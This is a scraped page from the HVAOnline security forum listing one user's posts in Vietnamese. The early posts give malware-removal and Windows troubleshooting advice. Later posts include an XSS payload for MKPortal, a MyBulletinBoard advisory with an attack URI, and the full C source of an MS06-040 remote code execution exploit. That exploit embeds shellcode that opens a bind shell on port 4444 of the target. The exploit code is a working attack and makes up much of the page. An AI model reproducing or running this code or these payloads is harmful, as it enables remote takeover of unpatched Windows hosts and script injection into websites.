[mtdiyd] c:\winnt\system32\mtdiyd.exe<br/> O4 - HKLM\..\RunOnce: [Local runole service] C:\WINNT\System32\srvc32.exe<br/> O4 - HKLM\..\RunOnce: [Srv32 spool service] C:\WINNT\System32\spoolsrv32.exe<br/> O4 - HKCU\..\RunOnce: [Local runole service] C:\WINNT\System32\srvc32.exe<br/> O4 - HKCU\..\RunOnce: [Srv32 spool service] C:\WINNT\System32\spoolsrv32.exe</b></font><br/><br/> Đóng tất cả cửa sổ ngoại trừ HijackThis và nhấn Fix.<br/><br/> Và trong Safe Mode, delete những cái sau: (nên show hidden files)<br/> (C:\Windows\ hoặc C:\Windows\System32\)<br/><br/> <b><font color='orange'>\farmmext.exe<br/> \system32\mtdiyd.exe<br/> \System32\srvc32.exe<br/> \System32\spoolsrv32.exe</font></b><br/><br/> Reboot lại xem thử.<br/><br/> Mà tốt nhất cậu scan rồi post file log lên để tôi check sơ.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/28.html">Thảo luận virus, trojan, spyware, worm...</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3730.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3730/22047.html#22047,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Vấn đề này tôi gặp là do lỗi copy cả file autorun trong USB qua đè lên autorun trong máy (do Ctrl+A -&gt; Copy -&gt; Paste)<br/><br/> Giờ thì<br/> + Vô Folder Options-&gt; View --&gt; Show Hidden Files and Folder<br/> + Bỏ chọn ô Hide protect operating system -&gt; OK<br/><br/> Nhìn vào ổ C/D sẽ xuất hiện 1 file là autorun.exe. Xóa file đó đi, rồi Log Off hoặc Restart. Set lại mấy options trong Folder Option như cũ.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/26.html">Thảo luận các loại thiết bị máy tính</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3755.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3755/22044.html#22044,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Khi hỏi cũng không ghi rõ main loại gì làm sao giúp. Thử load lại default của nó xem.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3774.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3774/22041.html#22041,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Thử vô SafeMode xoá, nếu xoá xong mà vô lại win vẫn còn thì scan virus xem sao<br/> Thân</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3776.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3776/22040.html#22040,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><blockquote>xxs in MKPortal M1.1 Rc1<br/><br/> info:<br/> file:index.php<br/><br/> google======&gt;MKPortal M1.1 Rc1 ©2003-2005<br/><br/> Exp:<br/><br/><span class="link"> http://www.sitename.com/index.php?ind=</span>"&gt;&lt;script&gt;alert(1);&lt;/script&gt;<br/><br/> --------------------------------------<br/> By Crack_man&nbsp;
</blockquote><br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3634.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3634/21065.html#21065,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Check here:<br/> http://www.zhangduo.com/driverbackup.html<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3482.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3482/20152.html#20152,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>Class: Input Validation Error
CVE:
Remote: Yes
Local: No
Published: Aug 30 2006 12:00AM
Updated: Aug 30 2006 06:23PM
Credit: imei addmimistrator is credited with the discovery of this vulnerability.
Vulnerable:
MyBulletinBoard MyBulletinBoard 1.1.7
MyBulletinBoard MyBulletinBoard 1.1.6
MyBulletinBoard MyBulletinBoard 1.1.5
MyBulletinBoard MyBulletinBoard 1.1.4
MyBulletinBoard MyBulletinBoard 1.1.3
MyBulletinBoard MyBulletinBoard 1.1.2
MyBulletinBoard MyBulletinBoard 1.1.1
MyBulletinBoard MyBulletinBoard 1.1
MyBulletinBoard MyBulletinBoard 1.0.4
MyBulletinBoard MyBulletinBoard 1.0.3
MyBulletinBoard MyBulletinBoard 1.0.2
MyBulletinBoard MyBulletinBoard 1.0.1
MyBulletinBoard MyBulletinBoard 1.0 PR2
MyBulletinBoard MyBulletinBoard 1.0
Not Vulnerable:
MyBulletinBoard MyBulletinBoard 1.1.8
This issue can be exploited through a web client.
An example URI has been provided:<span class="link"> http://www.example.com/admin/index.php?_SERVER&#91;PHP_SELF&#93;=http://www.example.com</span></pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3460.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3460/20151.html#20151,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Hi<br/> Mình từng đi cài nhiều dv internet cho bạn bè, dùng DF Enterprise. Thỉnh thoảng vẫn bị sự cố như vậy. Đôi khi lại do dây cáp gắm vào HDD không chặc. Nhưng nếu bạn dùng máy ở nhà thì không nên dùng DF, không tốt cho ổ cứng đâu.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3476.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3476/20149.html#20149,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Và nhớ chuẩn bị thêm, không chỉ có mất file system32\hal.dll mà sao khi bạn copy thì sẽ báo thiếu thêm vài file nữa <img src="/hvaonline/images/smilies/b5e9b4f86ce43ca65bd79c894c4a924c.gif" border="0" alt="smilie" align="absbottom"> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3334.html">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3334/19001.html#19001,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Rated as : Critical<br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>/*
* MS06-040 Remote Code Execution Proof of Concept
*
* Ported by ub3r st4r aka iRP
* ---------------------------------------------------------------------
* Tested Against:
* Windows XP SP1
* Windows 2000 SP4
*
* Systems Affected:
* Microsoft Windows 2000 SP0-SP4
* Microsoft Windows XP SP0-SP1
* Microsoft Windows NT 4.0
* ---------------------------------------------------------------------
* This is provided as proof-of-concept code only for educational
* purposes and testing by authorized individuals with permission
* to do so.
*
* PRIVATE v.0.2 &#40;08-27-06&#41;
*/
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#pragma comment&#40;lib, "mpr"&#41;
#pragma comment&#40;lib, "Rpcrt4"&#41;
// bind uuid interface: 4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0
unsigned char DCERPC_Bind_RPC_Service&#91;&#93; =
"x05x00x0Bx03x10x00x00x00x48x00x00x00x00x00x00x00"
"xD0x16xD0x16x00x00x00x00x01x00x00x00x00x00x01x00"
"xC8x4Fx32x4Bx70x16xD3x01x12x78x5Ax47xBFx6ExE1x88"
"x03x00x00x00x04x5Dx88x8AxEBx1CxC9x11x9FxE8x08x00"
"x2Bx10x48x60x02x00x00x00";
// request windows api: NetprPathCanonicalize &#40;0x1f&#41;
unsigned char DCERPC_Request_RPC_Service&#91;&#93; =
"x05x00x00x03x10x00x00x00x30x08x00x00x00x00x00x00"
"x18x08x00x00x00x00x1fx00xffxffxffxffx01x00x00x00"
"x00x00x00x00x01x00x00x00x00x00x00x00";
// path ...
unsigned char DCERPC_Request_RPC_Service_&#91;&#93; =
"xfax00x00x00x02x00x00x00x00x00x00x00x02x00x00x00"
"x00x00x00x00xfax00x00x00x00x00x00x00";
unsigned char sc&#91;&#93; =
"x6ax51x59xd9xeexd9x74x24xf4x5bx81x73x13xa8x97x90"
"x88x83xebxfcxe2xf4x29x53x6fx67x57x68xd4x74xc2x7c"
"xddx60x51x68x6fx77xc8x1cxfcxacx8cx1cxd5xb4x23xeb"
"x95xf0xa9x78x1bxc7xb0x1cxcfxa8xa9x7cxd9x03x9cx1c"
"x91x66x99x57x09x24x2cx57xe4x8fx69x5dx9dx89x6ax7c"
"x64xb3xfcxb3xb8xfdx4dx1cxcfxacxa9x7cxf6x03xa4xdc"
"x1bxd7xb4x96x7bx8bx84x1cx19xe4x8cx8bxf1x4bx99x4c"
"xf4x03xebxa7x1bxc8xa4x1cxe0x94x05x1cxd0x80xf6xff"
"x1exc6xa6x7bxc0x77x7exf1xc3xeexc0xa4xa2xe0xdfxe4"
"xa2xd7xfcx68x40xe0x63x7ax6cxb3xf8x68x46xd7x21x72"
"xf6x09x45x9fx92xddxc2x95x6fx58xc0x4ex99x7dx05xc0"
"x6fx5exfbxc4xc3xdbxfbxd4xc3xcbxfbx68x40xeexc0x86"
"xccxeexfbx1ex71x1dxc0x33x8axf8x6fxc0x6fx5exc2x87"
"xc1xddx57x47xf8x2cx05xb9x79xdfx57x41xc3xddx57x47"
"xf8x6dxe1x11xd9xdfx57x41xc0xdcxfcxc2x6fx58x3bxff"
"x77xf1x6exeexc7x77x7exc2x6fx58xcexfdxf4xeexc0xf4"
"xfdx01x4dxfdxc0xd1x81x5bx19x6fxc2xd3x19x6ax99x57"
"x63x22x56xd5xbdx76xeaxbbx03x05xd2xafx3bx23x03xff"
"xe2x76x1bx81x6fxfdxecx68x46xd3xffxc5xc1xd9xf9xfd"
"x91xd9xf9xc2xc1x77x78xffx3dx51xadx59xc3x77x7exfd"
"x6fx77x9fx68x40x03xffx6bx13x4cxccx68x46xdax57x47"
"xf8x67x66x77xf0xdbx57x41x6fx58";
int main&#40;int argc, char* argv&#91;&#93;&#41;
{
HANDLE hFile;
NETRESOURCE nr;
char szRemoteName&#91;MAX_PATH&#93;, szPipePath&#91;MAX_PATH&#93;;
unsigned int i;
unsigned char szInBuf&#91;4096&#93;;
unsigned long dwRead, nWritten;
unsigned char szReqBuf&#91;2096&#93;;
if &#40;argc &lt; 3&#41;{
printf&#40;"&#91;-&#93; Usage: ms06040poc &lt;host&gt;
&#91;target&#93;n"&#41;;
printf&#40;"t1 - Windows 2000 SP0-SP4n"&#41;;
printf&#40;"t2 - Windows XP SP0-SP1n"&#41;;
return -1;
}
memset&#40;szReqBuf, 0, sizeof&#40;szReqBuf&#41;&#41;;
if &#40;atoi&#40;argv&#91;2&#93;&#41; == 1&#41; {
unsigned char szBuff&#91;1064&#93;;
// build payload buffer
memset&#40;szBuff, 'x90', 1000&#41;;
memcpy&#40;szBuff+630, sc, sizeof&#40;sc&#41;&#41;;
for&#40;i=1000; i&lt;1064; i+=4&#41; {
memcpy&#40;szBuff+i, "x04x08x02x00", 4&#41;;
}
// build request buffer
memcpy&#40;szReqBuf, DCERPC_Request_RPC_Service,
sizeof&#40;DCERPC_Request_RPC_Service&#41;-1&#41;;
memcpy&#40;szReqBuf+44, "x15x02x00x00", 4&#41;; /*
max count */
memcpy&#40;szReqBuf+48, "x00x00x00x00", 4&#41;; /*
offset */
memcpy&#40;szReqBuf+52, "x15x02x00x00", 4&#41;; /*
actual count */
memcpy&#40;szReqBuf+56, szBuff, sizeof&#40;szBuff&#41;&#41;;
memcpy&#40;szReqBuf+1120, "x00x00x00x00", 4&#41;; /*
align string */
memcpy&#40;szReqBuf+1124, DCERPC_Request_RPC_Service_,
sizeof&#40;DCERPC_Request_RPC_Service_&#41;-1&#41;;
memcpy&#40;szReqBuf+1140 , "xebx02", 2&#41;;
}
if &#40;atoi&#40;argv&#91;2&#93;&#41; == 2&#41; {
unsigned char szBuff&#91;708&#93;;
memset&#40;szBuff, 'x90', 612&#41;; /* size of shellcode */
memcpy&#40;szBuff, sc, sizeof&#40;sc&#41;&#41;;
memcpy&#40;szBuff+612, "x0ax08x02x00", 4&#41;;
memset&#40;szBuff+616, 'A', 8&#41;; // 8 bytes padding
memcpy&#40;szBuff+624, "x04x08x02x00", 4&#41;;
memset&#40;szBuff+628, 'x90', 32&#41;;
memcpy&#40;szBuff+660, "x04x08x02x00", 4&#41;;
memset&#40;szBuff+664, 'B', 8&#41;; // 8 bytes padding
memcpy&#40;szBuff+672, "x04x08x02x00", 4&#41;;
memset&#40;szBuff+676, 'x90', 32&#41;;
// build request buffer
memcpy&#40;szReqBuf, DCERPC_Request_RPC_Service,
sizeof&#40;DCERPC_Request_RPC_Service&#41;-1&#41;;
memcpy&#40;szReqBuf+44, "x63x01x00x00", 4&#41;; /*
max count */
memcpy&#40;szReqBuf+48, "x00x00x00x00", 4&#41;; /*
offset */
memcpy&#40;szReqBuf+52, "x63x01x00x00", 4&#41;; /*
actual count */
memcpy&#40;szReqBuf+56, szBuff, sizeof&#40;szBuff&#41;&#41;;
memcpy&#40;szReqBuf+764, "x00x00x00x00", 4&#41;; /*
align string */
memcpy&#40;szReqBuf+768, DCERPC_Request_RPC_Service_,
sizeof&#40;DCERPC_Request_RPC_Service_&#41;-1&#41;;
}
printf&#40;"&#91;+&#93; Connecting to %s ... n", argv&#91;1&#93;&#41;;
_snprintf&#40;szRemoteName, sizeof&#40;szRemoteName&#41;,
"\\%s\ipc$", argv&#91;1&#93;&#41;;
nr.dwType = RESOURCETYPE_ANY;
nr.lpLocalName = NULL;
nr.lpProvider = NULL;
nr.lpRemoteName = szRemoteName;
if &#40;WNetAddConnection2&#40;&nr, "", "", 0&#41; !=
NO_ERROR&#41; {
printf&#40;"&#91;-&#93; Failed to connect to host !n"&#41;;
return -1;
}
_snprintf&#40;szPipePath, sizeof&#40;szPipePath&#41;,
"\\%s\pipe\browser", argv&#91;1&#93;&#41;;
hFile = CreateFile&#40;szPipePath, GENERIC_READ|GENERIC_WRITE, 0, NULL,
OPEN_EXISTING, 0, NULL&#41;;
if &#40;hFile == INVALID_HANDLE_VALUE&#41; {
printf&#40;"&#91;-&#93; Failed to open named pipe !n"&#41;;
return -1;
}
printf&#40;"&#91;+&#93; Binding to RPC interface ... n"&#41;;
if &#40;TransactNamedPipe&#40;hFile, DCERPC_Bind_RPC_Service,
sizeof&#40;DCERPC_Bind_RPC_Service&#41;, szInBuf, sizeof&#40;szInBuf&#41;, &dwRead, NULL&#41;
== 0&#41; {
printf&#40;"&#91;-&#93; Failed to bind to interface !n"&#41;;
CloseHandle&#40;hFile&#41;;
return -1;
}
printf&#40;"&#91;+&#93; Sending RPC request ... n"&#41;;
if &#40;!WriteFile&#40;hFile, szReqBuf, sizeof&#40;szReqBuf&#41;, &nWritten, 0&#41;&#41; {
printf&#40;"&#91;-&#93; Unable to transmit RPC request
!n"&#41;;
CloseHandle&#40;hFile&#41;;
return -1;
}
printf&#40;"&#91;+&#93; Now check for shell on %s:4444 !n",
argv&#91;1&#93;&#41;;
return 0;
}</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/6383.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
							<a href="/hvaonline/posts/listByUser/0/6383.html">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_prev_page.gif" width="5" height="9" alt="Page 1" title="Page 1"/>
							</a>
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/6383' + '.html'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" selected="selected">2</option>	
								<option value="3" >3</option>	
								<option value="4" >4</option>	
								<option value="5" >5</option>	
								<option value="6" >6</option>	
								<option value="7" >7</option>	
						</select>
						
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/60/6383.html">3</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/90/6383.html">4</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/120/6383.html">5</a></span>
								<a href="/hvaonline/posts/listByUser/150/6383.html">
									<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_next_page.gif" width="5" height="9" alt="Page 6" title="Page 6"/>
								</a>
						
						<a href="/hvaonline/posts/listByUser/180/6383.html">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (7)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
